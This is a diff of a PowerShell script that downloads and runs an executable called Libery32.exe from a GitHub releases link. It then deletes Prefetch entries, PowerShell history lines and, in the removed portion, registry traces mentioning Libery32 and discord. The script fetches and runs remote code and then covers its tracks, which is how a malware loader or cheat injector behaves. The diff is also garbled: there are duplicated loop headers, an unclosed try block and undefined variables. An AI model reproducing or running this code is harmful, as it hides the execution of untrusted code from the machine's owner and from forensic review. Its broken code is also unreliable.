@@ -1,30 +1,37 @@
+$exeUrls = @(
+    $ExeUrl,
+    'https://github.com/lubyralph6-maker/Libery32.ps1/releases/latest/download/Libery32.exe'
+)
+$downloaded = $false
+foreach ($url in $exeUrls) {
+foreach ($url in @($ExeUrl, 'https://github.com/lubyralph6-maker/Libery32.ps1/releases/latest/download/Libery32.exe')) {
+    if ([string]::IsNullOrWhiteSpace($url)) { continue }
+    try {
+        Write-Host ('Downloading: ' + $url) -ForegroundColor Cyan
+}
+Write-Host 'Downloaded' -ForegroundColor Green
+$proc = Start-Process -FilePath $tempExe -PassThru
+$proc.WaitForExit()
+Start-Sleep -Seconds 2
+$historyPath = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
+if (Test-Path $historyPath) {
+    try {
+        $lines = Get-Content $historyPath
+        $filtered = $lines | Where-Object {
+            ($_ -notmatch 'discord') -and
+            ($_ -notmatch 'cmd') -and
+            ($_ -notmatch 'libery32') -and
+            ($_ -notmatch 'Libery32') -and
+            ($_ -notmatch $randomName)
+        }
+        $filtered | Set-Content -Path $historyPath -Encoding UTF8
+        $keep = Get-Content $historyPath | Where-Object { $_ -notmatch $pattern }
+        $keep | Set-Content -Path $historyPath -Encoding UTF8
+    } catch {}
+}
 try {
-    Get-ChildItem 'C:\Windows\Prefetch' -Filter "*$randomName*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    Get-ChildItem 'C:\Windows\Prefetch' -Filter '*LIBERY32*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    Get-ChildItem 'C:\Windows\Prefetch' -Filter '*discord*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
     Remove-Item ('C:\Windows\Prefetch\*' + $randomName + '*') -Force -ErrorAction SilentlyContinue
     Remove-Item 'C:\Windows\Prefetch\*LIBERY32*' -Force -ErrorAction SilentlyContinue
     Remove-Item 'C:\Windows\Prefetch\*discord*' -Force -ErrorAction SilentlyContinue
 } catch {}
-try {
-    $muiPath = 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache'
-    Get-ItemProperty $muiPath -ErrorAction SilentlyContinue |
-        Get-Member -MemberType NoteProperty |
-        Where-Object { $_.Name -like "*$randomName*" -or $_.Name -like '*Libery32*' -or $_.Name -like '*discord*' } |
-        ForEach-Object { Remove-ItemProperty $muiPath -Name $_.Name -ErrorAction SilentlyContinue }
-} catch {}
-try {
-    $uaPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist'
-    if (Test-Path $uaPath) {
-        Get-ChildItem $uaPath | ForEach-Object {
-            $subKey = $_.Name -replace 'HKEY_CURRENT_USER', 'HKCU:'
-            Get-ItemProperty "$subKey\Count" -ErrorAction SilentlyContinue |
-                Get-Member -MemberType NoteProperty |
-                Where-Object { $_.Name -like "*$randomName*" -or $_.Name -like '*Libery32*' -or $_.Name -like '*discord*' } |
-                ForEach-Object { Remove-ItemProperty "$subKey\Count" -Name $_.Name -ErrorAction SilentlyContinue }
-        }
-    }
-} catch {}
 Clear-History
-Write-Host 'Finished' -ForegroundColor Green
-Read-Host 'Press Enter to close'
